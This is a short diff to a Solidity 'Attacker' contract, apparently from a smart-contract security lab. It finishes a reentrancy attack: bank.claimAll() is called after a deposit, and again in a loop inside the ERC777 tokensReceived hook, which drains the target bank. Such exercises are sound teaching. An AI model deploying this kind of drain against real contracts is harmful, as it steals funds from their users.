@@ -39,7 +39,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO START ATTACK GOES HERE
 			require(amt>0, "Amount must be greater than zero");
 			bank.deposit{value: amt}();
-			//bank.claimAll();
+			bank.claimAll();
 	}
 
 	/*
@@ -66,9 +66,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 			ERC777 token = bank.token();
 			require(msg.sender == address(token), "Invalid token");
 			while (address(from).balance > 0 ) {
-           			//bank.claimAll();
-				//bank.claimAll();
-            			bank.withdrawals[msg.sender] += amount;
+           			bank.claimAll();
+				
         }
 				
 	}
